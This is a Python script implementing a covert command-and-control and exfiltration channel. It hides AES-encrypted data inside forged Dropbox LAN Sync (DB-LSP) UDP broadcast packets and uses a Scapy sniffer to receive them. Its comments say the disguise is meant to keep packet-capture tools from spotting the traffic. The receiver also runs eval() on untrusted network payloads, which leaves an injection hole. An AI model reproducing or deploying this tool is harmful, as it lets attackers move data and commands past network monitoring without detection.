#!/usr/bin/python

import os
import sys
import csv
import json
import socket
import base64
import hashlib
import threading

from scapy.all import *
from Crypto import Random
from Crypto.Cipher import AES
from StringIO import StringIO


PROMPT = "DB_LSP > "
counter = 0             # Create a Packet Counter


class AESCipher(object):

    def __init__(self, key):
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw))

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]

class mydict(dict):
    """
    This is here to avoid Python converting the dict to a single quote JSON rather than a double quote JSON. This might sound useless, but will make a lot of capture instrucments display the packet in a very diffrent manner nor identifying it as a JSON and therefore creating something which is very easy to discover.
    Thanks to https://stackoverflow.com/questions/18283725/how-to-create-a-python-dictionary-with-double-quotes-as-default-quote-format
    """
    def __str__(self):
        return json.dumps(self)

class DB_LSP(object):
    def __init__(self, cnc, data, key, port=17500):
        self.cnc = cnc
        self.port = port
        self.address = (self.cnc, self.port)
        self.data = data
        self.DEFAULT_STRUCT = {
            "host_int": 123456,
            "versions": [2, 0],
            "displayname": "",
            "port": self.port,
            "namespaces": [1, 2, 3]
        }
        self.payload = ""
        self.AES = AESCipher(key=key)

    def _Create(self):
        this_data = self.DEFAULT_STRUCT
        this_data['host_int'] = self.AES.encrypt(raw=self.data)
        self.payload = str(mydict(this_data))

    def Send(self):
        # Try to create socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            if ".255" in self.address[0]:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            else:
                s.bind(('', self.port))
    	except:
    		sys.stderr.write('Failed to create socket.\n')
    		return False

        try:
            s.sendto(self.payload, self.address)
            sys.stdout.write("%s bytes sent to %s.\n" % (len(self.payload), self.address))
        except:
            sys.stderr.write("Error sending message to %s.\n" % str(self.address))
            return False
        return True

def SniffAndDecode(key, host, port=17500):

    AESProvider = AESCipher(key=key)

    def custom_action(packet):
        global counter
        counter += 1
        if packet[0][1].src == host:
            if packet[0][UDP].sport == port:
                try:
                    message = str(packet[0][UDP].payload).strip()
                    jdump = eval(message)
                except:
                    sys.stderr.write("Got message from the right IP on the write port but it does not look like a DB-LSP message.\n")
                    sys.stderr.flush()
                    return
                try:
                    mess = AESProvider.decrypt(enc=jdump['host_int'].strip())
                    sys.stdout.write("\n\t%s -> %s\n" % (host, mess))
                    sys.stdout.flush()
                    return
                except:
                    sys.stderr.write("Message was recevived but not decrypted.\n")
                    sys.stderr.flush()
                    return
            else:
                return

    ## Setup sniff, filtering for IP traffic
    sys.stdout.write("Starting listener for %s.\n" % host)
    sniff(filter="udp", prn=custom_action)

def SniffWrapper(key, host, port=17500):
    th = threading.Thread(target=SniffAndDecode, args=(key, host, port))
    th.start()
    return th

def StartShell():
    params = {}
    active = False
    _help()
    while True:
        if active:
            sys.stdout.write(params['server']+'@'+PROMPT)
        else:
            sys.stdout.write(PROMPT)

        try:
            command = raw_input()
        except:
            sys.stderr.write("Whhhat?\n")
            continue

        if command.strip() == "exit" or command.strip() == "quit":
            if active:
                params['thread']._Thread__stop()
            sys.stdout.write("Thanks and see you soon.\n")
            sys.exit()

        if command.strip() == "help":
            _help()
            continue

        if " " in command.strip():

            data = StringIO(command)
            reader = csv.reader(data, delimiter=' ')
            for row in reader:
                split_command = row

            if split_command[0] == "send":

                # Check that a key was set.
                try:
                    a = key=params['key']
                except:
                    sys.stderr.write("Please set a key with 'set key P@$$WorD!'.\n")
                    continue

                if not active:
                    if len(split_command) == 3:
                        dbObj = DB_LSP(cnc=split_command[2], data=split_command[1], key=params['key'])
                        dbObj._Create()
                        dbObj.Send()
                    else:
                        sys.stderr.write("Please use 'send \"this is data\" 8.8.8.8'.\n")

                else:
                    if len(split_command) == 2:
                        dbObj = DB_LSP(cnc=params['server'], data=split_command[1], key=params['key'])
                        dbObj._Create()
                        dbObj.Send()
                    else:
                        sys.stderr.write("Please use 'send \"this is data\"' since you're in active mode.\n")

            elif split_command[0] == "set":
                if len(split_command) == 3:
                    params[split_command[1]] = split_command[2]
                    sys.stdout.write(" %s --> %s.\n" % (split_command[1], split_command[2]))
                else:
                    sys.stderr.write("Please use 'set param value'.\n")

            elif split_command[0] == "show":
                if split_command[1] == "params":
                    sys.stdout.write(str(params) + "\n")
                else:
                    sys.stderr.write("I don't know what to show you.\n")

            elif split_command[0] == "active":
                try:
                    a = params['listener']
                except:
                    sys.stderr.write("Please set a listener (where messages will be coming from) with 'set listener 127.0.0.1'.\n")
                    continue

                try:
                    a = key=params['key']
                except:
                    sys.stderr.write("Please set a key with 'set key P@$$WorD!'.\n")
                    continue

                sys.stdout.write("Starting active mode with %s.\n" % split_command[1])
                thread = SniffWrapper(key=params['key'], host=params['listener'])
                params['thread'] = thread
                active = True
                params['server'] = split_command[1]

            elif split_command[0] == "deactivate":
                sys.stdout.write("Deactivating.\n")
                params['thread']._Thread__stop()
                active = False

            else:
                pass

def _help():
    help_text = """
    To communicate between two hosts over broadcast you will need:
    \t1) Setup an ecnryption key whichi will be identical on both hosts.
    \t\tset key 123456
    \t2) Know which host is going to broadcast the message:
    \t\tset listener 10.0.0.1
    \t3) Start active mode:
    \t\tactive 10.0.0.255

    Now just send messages with:
    \tsend "hello world"

    """
    print(help_text)


if __name__ == "__main__":
    StartShell()

"""
# Constant Sniff and Decode :
SniffAndDecode(key="123456", host="OtherIP", port=17500)

# Send a message:
obj = DB_LSP(key="123456", data="Hello World", host="192.168.0.255", port=17500)
obj.Send()
"""
